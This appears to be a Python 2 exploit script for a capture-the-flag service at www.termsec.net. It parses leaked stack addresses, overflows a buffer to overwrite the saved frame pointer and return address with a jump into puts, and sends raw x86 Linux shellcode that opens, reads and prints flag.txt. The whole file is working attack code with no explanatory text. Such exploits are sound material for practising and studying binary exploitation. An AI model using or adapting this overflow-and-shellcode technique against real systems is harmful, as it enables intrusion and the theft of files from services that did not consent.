#!/usr/bin/env python

import struct
from struct import pack
import socket
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("www.termsec.net", 17284))

fd = "\x01"
sc = ("\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
           "\xeb\x32\x5b\xb0\x05\x31\xc9\xcd"
           "\x80\x89\xc6\xeb\x06\xb0\x01\x31"
           "\xdb\xcd\x80\x89\xf3\xb0\x03\x83"
           "\xec\x01\x8d\x0c\x24\xb2\x01\xcd"
           "\x80\x31\xdb\x39\xc3\x74\xe6\xb0"
           "\x04\xb3" +fd+ "\xb2\x01\xcd\x80\x83"
           "\xc4\x01\xeb\xdf\xe8\xc9\xff\xff"
           "\xffflag.txt\x00")

def main():
	puts = 0x8049d08

	data = dbgrecv()

	i = data.find("0x")
	buf1 = int(data[i:i+10], 16)
	print "[+] buf1: %x" % buf1

	i = data.find("0x", i+10)
	buf2 = int(data[i:i+10], 16)
	print "[+] buf2: %x" % buf2

	ebp = buf1 + 0x114
	pad = 'A' * 0x29

	payload = pad + l(ebp) + l(puts) + l(buf2) 
	ret_to = l(buf2+8) + "\x00\x00\x00\x00" + sc

	#dbg()

	s.sendall(payload + "\n")
	s.sendall(ret_to + "\n")

	while True:
		dbgrecv()
		time.sleep(1)


def l(i):
	return struct.pack("I", i)

def dbg():
	print "[+] Pause to attach debugger..."
	raw_input()

def dbgrecv():
	data = s.recv(4096)

	print data

	#if is_ascii(data):
	#	print "[+] recv(%d): %s" % (len(data), data)
	#else:
	#	print "[+] recv(%d) non-ascii" % len(data)

	return data

def is_ascii(d):
	return all(ord(c) < 128 for c in d)


if __name__ == "__main__":
	main()
